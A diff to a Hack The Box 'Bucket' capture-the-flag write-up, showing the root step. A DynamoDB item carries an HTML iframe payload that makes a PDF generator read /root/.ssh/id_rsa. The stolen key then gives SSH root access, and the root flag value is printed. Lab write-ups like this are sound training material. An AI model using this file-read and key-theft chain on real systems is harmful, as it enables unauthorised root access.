@@ -566,6 +566,7 @@ else
 3. After start scaning table with name *alerts* and search for a title with the word *Ransomware*
 4. Put contetnt to *data*
 5. Prints the data from that table into a PDF using Pd4Cmd
+6. Saving it in /var/www/bucket-app/files/
 
 We remeber, that we saw just one tablename *users*. So let's [create](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/getting-started-step-1.html) a new table name *alerts*.
 
@@ -579,14 +580,103 @@ Default region name [None]: us-east-1
 Default output format [None]: text
 ```
 
-Create table **alerts**:
+[Create table](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html) **alerts**:
 
 ```
+roy@bucket:/var/www/bucket-app$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566
+TABLEDESCRIPTION        1613470559.595  0       arn:aws:dynamodb:us-east-1:000000000000:table/alerts    alerts  0ACTIVE
+ATTRIBUTEDEFINITIONS    title   S
+ATTRIBUTEDEFINITIONS    data    S
+KEYSCHEMA       title   HASH
+KEYSCHEMA       data    RANGE
+PROVISIONEDTHROUGHPUT   0.0     0.0     0       10      5
+```
+
+```
+roy@bucket:/var/www/bucket-app$ aws dynamodb list-tables --endpoint-url http://127.0.0.1:4566
+TABLENAMES      alerts
+TABLENAMES      users
+```
+
+Add new lines *Ransomware* and *payload* to the table *alerts*
+
+```
+roy@bucket:/var/www/bucket-app/files$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"}}' --endpoint-url http://127.0.0.1:4566
+CONSUMEDCAPACITY        1.0     alerts
+```
+
+Send POST POST with `action=get_alerts`
+
+```
+roy@bucket:/var/www/bucket-app/files$ curl --data "action=get_alerts" http://localhost:8000/
+```
+
+And get result.pdf
+
+```
+roy@bucket:/var/www/bucket-app/files$ ls
+200.html  result.pdf
+```
+
+Copy to host
+
+```
+┌──(root💀kali)-[/home/kali/HTB/Bucket]
+└─# scp roy@bucket.htb:/var/www/bucket-app/files/result.pdf /home/kali/HTB/Bucket                             1 ⨯
+roy@bucket.htb's password: 
+result.pdf    
+```
+
+Open result.pdf
+
+![Bucket](https://github.com/Pash3nlee/HackTheBox/raw/main/images/16.PNG)
+
+And we get **root's id_rsa**.
+
+Create new file *id_rsa* and set privileges `chmod 600 id_rsa`.
+
+We get **root.txt**
+
+```
+┌──(root💀kali)-[/home/kali/HTB/Bucket]
+└─# ssh -i id_rsa root@bucket.htb                                                
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 16 Feb 2021 10:41:04 AM UTC
+
+  System load:                      0.0
+  Usage of /:                       33.6% of 17.59GB
+  Memory usage:                     17%
+  Swap usage:                       0%
+  Processes:                        257
+  Users logged in:                  1
+  IPv4 address for br-bee97070fb20: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.10.10.212
+  IPv6 address for ens160:          dead:beef::250:56ff:feb9:f0b2
 
 
+229 updates can be installed immediately.
+103 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
 
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Feb  9 14:39:03 2021
+root@bucket:~# ls
+backups  docker-compose.yml  files  restore.php  restore.sh  root.txt  snap  start.sh  sync.sh
+root@bucket:~# cat root.txt 
+2213f1f03e54938c3a0a12cad86feacc
+```
 
 # Result and Resources
+
+### Root flag was a difficult for me and I used many hints. I have fully analyzed the solution, that was very interesting. I enjoyed this box.
 
 1. https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
 2. https://github.com/dotPY-hax/gitlab_RCE
